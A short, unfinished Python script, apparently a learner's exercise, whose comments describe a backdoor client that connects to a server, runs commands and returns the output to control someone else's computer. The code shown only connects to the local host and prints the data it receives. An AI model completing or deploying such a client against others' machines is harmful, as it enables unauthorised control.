# Hackers would put on cd and run and connects to server


# Once running, connect to server, just wait for instructions
# Run commands, and send back output to server
# So controlling someone else's computer


import os  
import subprocess
import socket

def connectToServer():	
	s = socket.socket()         # Create a socket object
	host = socket.gethostname() # IP Address of server
	port = 8080                # Port of server
	s.connect((host, port))
	
	while True: # Keep  listening for instructions
		data = s.recv(1024)
		print "data is: {}".format(data)
	
	s.close                     # Close the socket when done

# Example program
if __name__ == "__main__":
	connectToServer()